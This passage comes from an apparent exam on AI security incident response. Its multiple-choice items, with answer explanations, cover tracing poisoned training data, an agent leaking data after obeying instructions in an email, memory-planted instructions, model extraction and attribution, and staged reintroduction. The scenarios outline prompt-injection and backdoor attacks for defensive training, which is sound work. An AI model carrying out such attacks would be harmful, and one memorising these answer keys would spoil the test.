Ask the customer who uploaded the PDF to explain why they did it
exam.why: Hunting for the same carrier elsewhere establishes the full scope of the attack. A permanent ban, retraining and asking the customer don’t reveal other affected sessions.

exam.q: A model trained on scraped public data shows backdoor behaviour. Investigators have identified the poisoned web pages. What should they establish NEXT?
o: Whether the pages are still online, so they can be reported
Every model, fine-tune and index that used data from those web pages
The name of the person who wrote each of the poisoned web pages
Whether the scraping tool was the latest version when it ran
exam.why: Lineage from the poisoned sources to every affected asset defines what must be contained and cleaned. Reporting pages, identifying authors and checking tool versions come later or matter less.

exam.q: During root cause analysis, the team finds an agent leaked data because untrusted email content wasn’t separated from instructions. The engineering lead proposes closing the RCA with "agent followed malicious email". What should the security lead say?
o: Agree, because the agent following the email is clearly what caused the leak
That is the proximate cause; record the design gaps as root causes, with fixes
Close the RCA, but add a recommendation to train staff on phishing emails
Ask the email provider to explain why it delivered the malicious message
exam.why: The root causes are the design gaps that allowed the agent to be manipulated and to leak data. Recording only the proximate cause leaves them unfixed.

exam.q: Investigators can’t line up gateway logs with agent traces because the timestamps disagree by several minutes. What should they do?
o: Discard the gateway logs completely, and rely only on the agent traces instead
Measure each source’s offset, normalise to UTC and record the correction
Assume the gateway logs are correct, since gateways are more reliable
Average the two sets of timestamps to produce a compromise timeline
exam.why: Measured, documented corrections produce a defensible unified timeline. Discarding sources loses evidence, and assumptions or averages introduce errors.

exam.q: A company’s model was extracted through thousands of queries from many cloud accounts. The CEO wants to name the competitor suspected of being behind it in a press release. What is the BEST course of action?
o: Name the competitor, because only a competitor would want the model
Assess attribution with stated confidence, keep evidence and take legal advice
Launch an attack on the competitor’s systems to gather proof of the theft
Ignore attribution entirely, since it never affects the security response at all
exam.why: Public claims need well-founded attribution and legal advice; evidence supports any legal or law enforcement action. Assumptions, hacking back and ignoring attribution are all wrong.

exam.q: Which statement BEST describes the role of attribution in an AI incident?
o: It must be completed before any containment action is allowed to begin
A confidence judgement that informs defences, sharing and reporting
A formal legal finding that proves who carried out the attack
An optional exercise that only matters for nation-state attacks
exam.why: Attribution is a judgement with stated confidence that helps defenders and authorities. It never delays containment and is not proof.

exam.q: A poisoned customer service model was retrained on cleaned data, but an investigation shows the same poisoned data was also used to fine-tune a sales assistant. What should happen?
o: Nothing, because the sales assistant hasn’t shown any problems in production so far
Treat the sales assistant as affected: test it, and rebuild it from clean data
Delete the sales assistant permanently, as it can never be trusted again
Add a disclaimer to the sales assistant’s responses about possible errors
exam.why: Any model trained on the poisoned data may carry the backdoor, even if it hasn’t been triggered yet. Testing and rebuilding from clean data eradicates it.

exam.q: Planted instructions from an attack were written into an agent’s long-term memory. The vulnerable tool has been patched. Is eradication complete?
o: Yes, because patching the tool removes the attacker’s way in
No: the memory entries must be purged, or they may re-trigger the behaviour
Yes, as long as the agent’s model is also updated to the very latest version
No: the agent must be deleted, because memory can never be cleaned
exam.why: Memory is a persistence mechanism: planted instructions can be read again and restart the attack. Patching the entry point alone isn’t enough.

exam.q: A fixed model blocks every replayed attack prompt, but customer complaints about refusals of legitimate requests rise sharply in the canary. What should the team conclude?
o: The fix is successful, because every attack prompt was blocked
The fix causes over-refusal, failing quality regression, so it needs work
The complaints are probably from attackers testing out the new controls on purpose
The canary should be expanded to all users to gather more feedback
exam.why: Regression testing covers what must keep working as well as what must now fail. Over-refusal is a regression in quality and usefulness.

exam.q: Which reintroduction approach BEST balances speed and safety after a serious agent incident?
o: Restore full service as soon as the incident’s exact inputs are blocked
Pre-agreed criteria, regression and red team testing, then shadow and canary
Keep the agent offline permanently, replacing it with a manual process
Restore full service, and rely on users to report any remaining problems
exam.why: Evidence-based gates and staged rollout restore service with confidence. Testing only exact inputs, permanent shutdown or relying on users are poor choices.
